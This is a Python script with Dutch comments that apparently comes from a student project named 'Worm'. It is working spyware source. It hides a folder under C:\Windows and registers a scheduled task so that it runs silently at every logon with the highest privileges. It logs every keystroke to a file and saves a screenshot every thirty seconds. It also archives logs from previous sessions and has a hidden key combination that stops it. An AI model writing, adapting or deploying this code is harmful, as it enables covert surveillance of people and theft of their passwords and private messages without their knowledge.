import os
import shutil
import threading
import subprocess
import sys
import time
import zipfile
from datetime import datetime

# Importeert de nodige imports om het script te runnen
try:
    import keyboard
    import pyscreeze
    import pyautogui
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pillow", "pyscreeze"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
    import keyboard
    import pyscreeze
    import pyautogui

# variabelen
exit_event = threading.Event()
now = datetime.now()
date_timeFull = now.strftime("%d/%m/%Y, %H:%M:%S")
date_timeFolder = now.strftime("%d.%m.%Y_%H.%M.%S")
date_timeDay = now.strftime("%d-%m-%Y")
script_path = os.path.abspath("C:\\Windows\\s142486_WormFolder\\EXEWorm.exe")
hidden_folder_path = os.path.expanduser("C:\\Windows\\s142486_WormFolder")
path = f"C:\\Windows\\s142486_WormFolder\\Logs_{date_timeFolder}\\keylog.txt"
logs = "C:\\Windows\\s142486_WormFolder\\" 

# functie die een taak maakt in taakplanner waarbij het script zichzelf uitvoert
def runOnLogin(task_name, script_path):
    command = [
        "schtasks",
        "/create",
        "/sc", "ONLOGON",
        "/tn", task_name,
        "/tr", f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{script_path}"',
        "/rl", "highest",
        "/F" 
    ]
    subprocess.run(command, capture_output=True, text=True)
    
# maakt de folder scructuur
def makeStructure():
    if not os.path.exists(hidden_folder_path):
        os.makedirs(hidden_folder_path)
    os.system(f'attrib +h "{hidden_folder_path}"')
    if not os.path.exists(hidden_folder_path+f"\\Logs_{date_timeFolder}"):
        os.makedirs(hidden_folder_path+f"\\Logs_{date_timeFolder}")
    if not os.path.exists(hidden_folder_path+f"\\Logs_{date_timeFolder}\\ScreenLogs"):
        os.makedirs(hidden_folder_path+f"\\Logs_{date_timeFolder}\\ScreenLogs")

# Zips the log folder of the previeus session
def zipPrevSes(directory):
    if not os.path.isdir(directory):
        return
    
    subdirs = [os.path.join(directory, d) for d in os.listdir(directory) if os.path.isdir(os.path.join(directory, d))]
    oldestFolder = min(subdirs, key=os.path.getctime)
    oldestFolderName = os.path.basename(oldestFolder)
    
    if len(subdirs) == 2:
        with zipfile.ZipFile(f"{logs}\\{oldestFolderName}.zip", 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(oldestFolder):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, start=os.path.dirname(directory))
                    zipf.write(file_path, arcname)
    else:
        return
    shutil.rmtree(oldestFolder)
    
# screenshot function
def take_screenshot():
    timestamp = datetime.now().strftime("%H.%M.%S")
    
    filename = f"{hidden_folder_path}\\Logs_{date_timeFolder}\\ScreenLogs\\Screenlog_{timestamp}.jpg"
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    
def screenLogger():
    while not exit_event.is_set():
        time.sleep(30)  
        take_screenshot()

# Keylog functie
def keyLogger():
    with open(path, 'a') as data_file:
        data_file.write(f"|============================================================================|")
        data_file.write(f"\n|         V         ! KEYBOARD LOG: {date_timeFull} !         V         |")
        data_file.write(f"\n|============================================================================|\n\n")
        data_file.write(f"<<{now.strftime("%H:%M")}>> ")
        while not exit_event.is_set():
            try:  
                temp_now = datetime.now() 
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    if event.name == "space":
                        data_file.write(" ")
                    elif event.name == "windows gauche":
                        data_file.write(" WINDOW ")
                    elif event.name == "backspace":
                        data_file.write(" BACKSPACE ")
                    elif event.name == "alt":
                        data_file.write(" ALT ")
                    elif event.name == "alt gr":
                        data_file.write(" ALT_GR ")
                    elif event.name == "ctrl droite":
                        data_file.write(" RIGHT_CTRL ")
                    elif event.name == "ctrl":
                        data_file.write(" CTRL ")
                    elif event.name == "maj":
                        data_file.write(" SHIFT ")
                    elif event.name == "right shift":
                        data_file.write(" RIGHT_SHIFT ")
                    elif event.name == "verr.maj":
                        data_file.write(" SHIFT_LOCK ")
                    elif event.name == "tab":
                        data_file.write(" TAB ")
                    elif event.name == "haut":
                        data_file.write(" ARROW_UP ")
                    elif event.name == "gauche":
                        data_file.write(" ARROW_LEFT ")
                    elif event.name == "bas":
                        data_file.write(" ARROW_DOWN ") 
                    elif event.name == "droite":
                        data_file.write(" ARROW_RIGHT ") 
                    elif event.name == "enter":
                        data_file.write(" ENTER")
                        data_file.write('\n')
                        data_file.write(f"<<{temp_now.strftime("%H:%M")}>> ")
                    else:
                        data_file.write(event.name)
                    data_file.flush()
            except Exception as e:
                data_file.write(f"Error: {e}")
                data_file.flush()
                break      

# Killswitch functie
def killSwitch():
    keyboard.wait("ctrl+alt+k")
    exit_event.set()
    
runOnLogin("s142486_Worm", script_path)
makeStructure()
zipPrevSes(logs)

keyLog_thread = threading.Thread(target=keyLogger, name="KeyLogger")
screenLog_thread = threading.Thread(target=screenLogger, name="ScreenLogger")
kill_thread = threading.Thread(target=killSwitch, name="StopKeybindMonitor")

keyLog_thread.start()
screenLog_thread.start()
kill_thread.start()

keyLog_thread.join()
screenLog_thread.join()
kill_thread.join()